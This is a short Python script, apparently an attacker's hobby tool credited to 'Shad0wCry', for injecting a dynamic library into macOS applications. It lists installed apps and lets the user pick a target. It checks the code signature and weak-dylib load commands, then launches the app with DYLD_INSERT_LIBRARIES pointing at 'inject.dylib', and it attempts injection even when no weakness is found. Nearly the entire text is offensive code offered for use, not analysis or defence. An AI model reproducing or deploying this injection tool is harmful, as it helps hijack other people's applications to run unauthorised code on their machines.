#Code bY Shad0wCry
import os
import subprocess

def list_applications():
    applications = [app for app in os.listdir('/Applications') if app.endswith('.app')]
    return applications

def check_vulnerability(app):
    app_path = f"/Applications/{app}/Contents/MacOS/{app[:-4]}"
    try:
        result = subprocess.run(['codesign', '-vvv', '--deep', '--strict', app_path], capture_output=True, text=True)
        if 'valid on disk' in result.stdout and 'satisfies its Designated Requirement' in result.stdout:
            return False
        else:
            return True
    except Exception as e:
        print(f"Error checking {app}: {e}")
        return True

def check_weak_dylibs(app):
    app_path = f"/Applications/{app}/Contents/MacOS/{app[:-4]}"
    try:
        result = subprocess.run(['otool', '-l', app_path], capture_output=True, text=True)
        if 'LC_LOAD_WEAK_DYLIB' in result.stdout:
            return True
        else:
            return False
    except Exception as e:
        print(f"Error checking weak dylibs for {app}: {e}")
        return True

def inject_dylib(app):
    app_path = f"/Applications/{app}/Contents/MacOS/{app[:-4]}"
    try:
        os.environ['DYLD_INSERT_LIBRARIES'] = 'inject.dylib'
        subprocess.run([app_path], check=True)
    except Exception as e:
        print(f"Error injecting {app}: {e}")

def main():
    applications = list_applications()
    print("Select an application to target:")
    for idx, app in enumerate(applications):
        print(f"{idx + 1}. {app}")
    app_number = int(input("Enter the number of the application: ")) - 1
    selected_app = applications[app_number]

    if not os.path.exists(f"/Applications/{selected_app}"):
        print(f"Error: {selected_app} does not exist.")
        return

    if check_vulnerability(selected_app):
        print(f"Attempting injection on {selected_app}...")
        if check_weak_dylibs(selected_app):
            print(f"{selected_app} has weak dylibs loaded.")
        else:
            print(f"{selected_app} does not have weak dylibs loaded, but attempting injection anyway.")
        inject_dylib(selected_app)
    else:
        print(f"{selected_app} is not vulnerable to dylib injection.")

if __name__ == "__main__":
    main()